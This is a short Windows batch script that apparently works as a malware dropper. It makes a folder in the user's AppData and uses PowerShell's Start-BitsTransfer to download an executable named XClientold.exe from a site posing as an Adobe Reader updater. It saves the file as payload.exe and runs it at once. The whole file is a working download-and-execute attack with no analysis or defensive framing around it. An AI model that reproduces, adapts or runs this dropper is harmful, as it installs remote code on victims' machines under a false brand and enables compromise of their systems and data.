@echo off
setlocal enabledelayedexpansion
set "payloadpath=%appdata%\Custom-Application\files\payload.exe"
if not exist "%appdata%\Custom-Application\files" mkdir "%appdata%\Custom-Application\files"
powershell -Command "Start-BitsTransfer -Source 'https://adobereaderplugins.github.io/adobe_updater/XClientold.exe' -Destination '%payloadpath%'"
start "" "%payloadpath%"
exit /b
